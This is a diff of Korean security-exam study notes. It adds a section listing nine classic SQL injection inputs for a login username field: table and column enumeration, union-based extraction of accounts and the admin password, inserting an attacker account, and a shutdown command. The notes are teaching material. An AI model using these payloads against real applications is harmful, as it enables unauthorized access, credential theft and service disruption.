@@ -203,9 +203,9 @@ Service-name: 보통은 FTP
 Authentication-method: 0(none), 1(authenticated)
 Completion-status: 전송상태 나타냄, c(완전한 전송), i(불완전한 전송)
 {: .notice--warning}
-tftp (UDP 이용), sftp(암호화)
-TCP 기반 (3way handshaking)
-wget으로 여러 파일 동시에 다운 가능하다.
+tftp (UDP 이용), sftp(암호화)  
+TCP 기반 (3way handshaking)  
+wget으로 여러 파일 동시에 다운 가능하다.  
 {: .notice}
 bounce Attack 포트 스캐닝: 가짜 메일을 보내서 익명의 ftp 서버 경유한다(Nmap -b)
 {: .notice}
@@ -226,6 +226,55 @@ bounce Attack 포트 스캐닝: 가짜 메일을 보내서 익명의 ftp 서버 
 Userid: 상태 코드가 401이면 사용자가 인증을 거치지 않은 것  
 상태 코드: 2xx(요청 성공), 4xx(클라이언트 오류), 5xx(서버 오류)  
 {: .notice--warning}
+---
+#### SW 개발 보안
+---
+SDLC 단계별 Software 보안 활동  
+Secure SDLC  
+보안기능(요구사항): 에러처리, 세션통제, …  
+{: .notice}
+---
+#### SQL Injection
+---
+**SQL**
+DDL: create table, alter table, drop table
+DML: insert, delete, update, select
+DCL: grant, revoke
+{: .notice}
+```
+공격 1 테이블명 알아내기 (having)
+username : ' having 1=1--
+```
+```
+공격 2 필드명 알아내기 (group by)
+username : 'group by users.id having 1=1--
+```
+공격 3 필드 타입 알아내기 (union)
+username : ' union select sum(username) from users--
+```
+```
+공격 4 계정만들기 (insert)
+username : '; insert into users values(666, 'attacker', 'foobar', 0xffff)--
+```
+```
+공격 5 버전 및 환경 알아내기
+username : 'union select @@version,1,1,1--
+```
+```
+공격 6 계정 추출하기
+username : 'union select min(username), 1,1,1 from users where username > 'a'--
+```
+``
+공격 7 계정의 패스워드 알아내기
+username : 'union select password,1,1,1 from users where username = 'admin'--
+```
+공격 8 transact-SQL  
+select 문으로 직접 쿼리문 전송  
+{: .notice}
+```
+공격 9 shutdown
+username : '; shutdown--
+```
 ---
 ### 과목4 정보보안일반
 ---
